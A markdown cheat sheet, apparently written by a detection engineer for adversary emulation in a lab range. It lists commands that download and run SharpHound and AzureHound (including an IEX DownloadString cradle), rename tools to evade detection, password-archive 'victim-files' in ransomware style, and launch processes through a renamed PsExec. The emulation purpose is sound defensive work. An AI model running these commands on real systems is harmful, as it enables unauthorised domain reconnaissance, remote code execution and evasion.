# Analytic Creation and Emulation

References:
- https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
- https://github.com/BloodHoundAD/SharpHound3
- 

## SharpHound

### Powershell for bloodhound testing   

```
    [Net.ServicePointManager]::SecurityProtocol = 
            [Net.SecurityProtocolType]::Tls12
      Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1" -OutFile "c:\temp\SharpHound.ps1"
      import-module c:\temp\SharpHound.ps1
      Invoke-BloodHound -OutputDirectory c:\temp\
```

```
      IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');
      Invoke-BloodHound -OutputDirectory $env:Temp
```

Copy/Paste cmdline tests:

- `cmd.exe /c powershell.exe import-module c:\temp\SharpHound.ps1; Invoke-BloodHound -CollectionMethod DCOnly -NoSaveCache -RandomizeFilenames -EncryptZip`

- `cmd.exe /c powershell.exe import-module c:\temp\SharpHound.ps1; Invoke-BloodHound -CollectionMethod all`

- `cmd.exe /c powershell.exe import-module c:\temp\SharpHound.ps1; Invoke-BloodHound -OutputDirectory c:\temp\`


#### Binary/PE usage

```
    [Net.ServicePointManager]::SecurityProtocol = 
            [Net.SecurityProtocolType]::Tls12
      Invoke-WebRequest "https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe" -OutFile "c:\temp\SharpHound.exe"

```

- `cmd.exe /c c:\temp\sharphound.exe --CollectionMethod all`
- `cmd.exe /c c:\temp\sharphound.exe -c all`

Renamed

```
copy-item 'c:\temp\sharphound.exe' c:\temp\notsharph.exe
c:\temp\notsharph.exe --CollectionMethod all
```

## AzureHound

```
    [Net.ServicePointManager]::SecurityProtocol = 
            [Net.SecurityProtocolType]::Tls12
      Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/AzureHound.ps1" -OutFile "c:\temp\AzureHound.ps1"
      import-module c:\temp\AzureHound.ps1
      Invoke-AzureHound
```

- `cmd.exe /c powershell.exe import-module c:\temp\AzureHound.ps1; Invoke-AzureHound`

## PSexec, Archive Testing

In Attack Range:
```
copy-item 'C:\Program Files\7-Zip\7z.exe' c:\temp\not7z.exe
copy-item 'C:\Program Files\7-Zip\7z.dll' c:\temp\7z.dll
mkdir c:\temp\victim-files
cd c:\temp\victim-files
echo "This file will be encrypted" > .\encrypted_file.txt
cmd.exe /c c:\temp\not7z.exe u archive.7z *txt -pblue
dir
```

```
bitsadmin /transfer myDownloadJob /download /priority normal "https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe" c:\temp\winrar.exe
cmd.exe /c c:\temp\winrar.exe /S
```

```
    [Net.ServicePointManager]::SecurityProtocol = 
            [Net.SecurityProtocolType]::Tls12
      Invoke-WebRequest "https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe" -OutFile "c:\temp\winrar.exe"

```
```
copy-item C:\Program Files\WinRAR\winrar.exe c:\temp\notrar.exe

mkdir .\tmp\victim-files
cd .\tmp\victim-files
echo "This file will be encrypted" > .\encrypted_file.txt
cmd.exe /c c:\temp\notrar.exe a -hp"blue" hello.rar
```

```
    [Net.ServicePointManager]::SecurityProtocol = 
            [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
Copy-Item $env:TEMP\PsTools\PsExec.exe c:\temp\notps.exe

cmd.exe /c c:\temp\notps.exe -accepteula -c wmic process call create notepad.exe
```